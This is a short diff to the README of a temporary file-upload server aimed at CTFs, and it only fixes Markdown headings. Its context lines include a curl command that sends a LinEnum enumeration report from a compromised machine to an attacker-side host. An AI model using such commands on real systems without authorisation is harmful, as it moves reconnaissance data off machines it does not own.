@@ -14,14 +14,14 @@ A Upload Server For temporary use mostly helpful in ctfs etc.
 
 ## Uploading Using CLI
 
-###Linux
+### Linux
 - Using Curl
 ```shell
 curl -F filename=@LinEnum_report 10.10.14.23:8080
 ```
 
 
-###Windows Powershell
+### Windows Powershell
 - Uploading via powershell depends on powershell version, check powershell.txt for more commands
 - I would Strongly recommend using curl.exe `https://curl.se/download.html`
 ```shell
